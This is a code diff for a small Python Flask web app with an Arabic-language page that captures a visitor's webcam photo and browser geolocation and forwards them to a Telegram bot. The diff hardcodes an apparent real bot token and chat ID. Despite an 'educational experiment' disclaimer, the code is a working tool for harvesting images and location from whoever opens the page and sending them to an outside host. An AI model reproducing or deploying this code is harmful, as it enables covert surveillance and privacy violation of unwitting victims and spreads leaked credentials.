@@ -1,17 +1,13 @@
 import base64
 import requests
 import os
-from flask import Flask, request, render_template_string, abort
+from flask import Flask, request, render_template_string
+
+# استبدل القيم الوهمية بقيمك الحقيقية
+BOT_TOKEN = "123456789:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4"   # ← استبدل هذا
+CHAT_ID = "6969597735"                                         # ← استبدل هذا
 
 app = Flask(__name__)
-
-# اقرأ التوكنات من Environment
-BOT_TOKEN = os.environ.get("7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4")
-CHAT_ID = os.environ.get("6969597735")
-
-if not 7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4or not 6969597735:
-    print("7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4")
-    abort(500, description="Missing Telegram credentials.")
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -43,11 +39,11 @@ HTML_PAGE = """
 <body>
   <h2>تجربة الكاميرا والموقع</h2>
   <p style="color:red; font-weight:bold;">
-  ⚠️ هذه مجرد تجربة تعليمية. لا تستخدم الكود ضد أي شخص بدون إذنه. قد تتعرض للمسؤولية القانونية.
+    ⚠️ هذه مجرد تجربة تعليمية. لا تستخدم الكود ضد أي شخص بدون إذنه. قد تتعرض للمسؤولية القانونية.
   </p>
-  <video id="6969597735" width="320" height="240" autoplay></video><br/>
-  <button id="6969597735">التقاط صورة وإرسال البيانات</button>
-  <canvas id="6969597735" width="320" height="240" style="display:none;"></canvas>
+  <video id="video" width="320" height="240" autoplay></video><br/>
+  <button id="snap">التقاط صورة وإرسال البيانات</button>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
   <p id="status"></p>
 
   <script>
@@ -115,11 +111,9 @@ def index():
 def upload():
     data = request.json
 
-    # تأكد إن البيانات موجودة
     if not data:
         return "No data provided", 400
 
-    # معالجة الصورة إذا موجودة
     image_data = data.get("image")
     if image_data:
         try:
@@ -128,11 +122,10 @@ def upload():
             with open(filename, "wb") as f:
                 f.write(base64.b64decode(base64_data))
             send_photo_to_telegram(filename)
-            os.remove(filename)  # حذف الصورة بعد الإرسال
+            os.remove(filename)
         except Exception as e:
             print(f"خطأ أثناء معالجة الصورة: {e}")
 
-    # إرسال الموقع
     latitude = data.get("latitude")
     longitude = data.get("longitude")
 
@@ -143,19 +136,19 @@ def upload():
     return "تم استلام البيانات"
 
 def send_photo_to_telegram(filepath):
-    url = f"https://api.telegram.org/bot{7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4}/sendPhoto"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
     with open(filepath, "rb") as photo:
         files = {"photo": photo}
         data = {
-            "chat_id": 6969597735,
+            "chat_id": CHAT_ID,
             "caption": "📸 صورة ملتقطة من المستخدم (تجربة توعوية)"
         }
         response = requests.post(url, files=files, data=data)
         print("رد تيليجرام (صورة):", response.text)
 
 def send_message_to_telegram(text):
-    url = f"https://api.telegram.org/bot{7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4}/sendMessage"
-    data = {"6969597735": 6969597735, "text": text}
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": text}
     response = requests.post(url, data=data)
     print("رد تيليجرام (نص):", response.text)
 
